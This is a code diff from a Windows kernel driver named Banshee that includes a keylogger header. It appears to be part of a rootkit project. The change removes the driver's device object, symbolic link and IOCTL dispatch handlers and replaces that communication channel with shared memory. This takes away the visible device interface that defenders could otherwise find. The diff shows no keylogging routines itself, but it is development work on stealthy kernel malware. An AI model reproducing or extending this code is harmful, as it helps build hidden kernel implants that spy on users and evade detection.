@@ -3,7 +3,7 @@
 
 #include "DriverMeta.hpp"
 #include "Globals.hpp"
-#include "IOCTLS.hpp"
+#include "Commands.hpp"
 #include "FileUtils.hpp"
 #include "Keylogger.hpp"
 
@@ -85,10 +85,11 @@ BeUnload(PDRIVER_OBJECT DriverObject)
         }
     }
 
+    // Delete shared memory
+    BeCloseSharedMemory(BeGlobals::hSharedMemory, BeGlobals::pSharedMemory);
+
     LOG_MSG("Byebye!\n");
         
-    IoDeleteSymbolicLink(&usDosDeviceName);
-    IoDeleteDevice(DriverObject->DeviceObject);
     return STATUS_SUCCESS;
 }
 
@@ -135,48 +136,12 @@ NTSTATUS
 BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
 {
     UNREFERENCED_PARAMETER(pRegistryPath);
+    UNREFERENCED_PARAMETER(pDriverObject);
 
     NTSTATUS NtStatus = STATUS_SUCCESS;
-    PDEVICE_OBJECT pDeviceObject = NULL;
-
-    LOG_MSG("Creating device\r\n");
-    NtStatus = IoCreateDevice(
-        pDriverObject,
-        0,
-        &usDeviceName,
-        FILE_DEVICE_UNKNOWN, // not associated with any real device
-        FILE_DEVICE_SECURE_OPEN,
-        FALSE,
-        &pDeviceObject
-    );
-
-    if (!NT_SUCCESS(NtStatus) || pDeviceObject == NULL)
-    {
-        return NtStatus;
-    }
-
-    LOG_MSG("Creating symbolic link\r\n");
-    NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDeviceName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
-    if (!NT_SUCCESS(NtStatus))
-    {
-        return NtStatus;
-    }
-
-
-    LOG_MSG("Setting routines\r\n");
-    pDriverObject->DriverUnload = (PDRIVER_UNLOAD)BeUnload;
-
-    // IRP Major Requests
-    for (ULONG uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; uiIndex++)
-    {
-        pDriverObject->MajorFunction[uiIndex] = (PDRIVER_DISPATCH)BeUnSupportedFunction;
-    }
-    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)BeClose;               // CloseHandle
-    pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
-    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl
 
     LOG_MSG("Init globals\r\n");
-    NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
+    NtStatus = BeGlobals::BeInitGlobals();
     if (!NT_SUCCESS(NtStatus))
     {
         return NtStatus;
@@ -193,9 +158,6 @@ BansheeEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     {
         return NtStatus;
     }
-
-    pDeviceObject->Flags |= DO_BUFFERED_IO;
-    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; // finished initializing
 
     return NtStatus;
 }
@@ -217,16 +179,5 @@ DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
     UNREFERENCED_PARAMETER(pDriverObject);
     UNREFERENCED_PARAMETER(pRegistryPath);
 
-    UNICODE_STRING createDriverRoutine = RTL_CONSTANT_STRING(L"IoCreateDriver"); // this sucks, but is needed for now, since we still use IOCTL to communicate
-    IOCREATEDRIVER IoCreateDriver = (IOCREATEDRIVER)MmGetSystemRoutineAddress(&createDriverRoutine);
-    
-    NTSTATUS status = IoCreateDriver(&usDriverName, &BansheeEntry);
-
-    if (NT_SUCCESS(status))
-    {
-        LOG_MSG("BansheeEntry Called \r\n");
-        return BansheeEntry(pDriverObject, pRegistryPath);
-    }
-
-    return status;
+    return BansheeEntry(pDriverObject, pRegistryPath);
 }
